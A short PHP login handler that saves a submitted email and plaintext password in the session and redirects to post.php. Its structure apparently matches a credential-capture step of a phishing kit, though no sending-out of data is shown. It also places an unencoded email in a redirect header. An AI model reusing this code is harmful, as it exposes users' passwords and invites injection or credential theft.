<?php

if($_SERVER['REQUEST_METHOD'] != "POST") {
    header("HTTP/1.0 403 Forbidden");
    print("Forbidden");
    exit();
}

session_start();

$_SESSION["email"] = $username = $_POST['email'];
$_SESSION["password"] = $password = $_POST['password'];

if ($username =="" || $password =="")    {
    header( "Location: ./?bl=1&email=$username");
}
 else {
    header( "Location: post.php");
  }
?>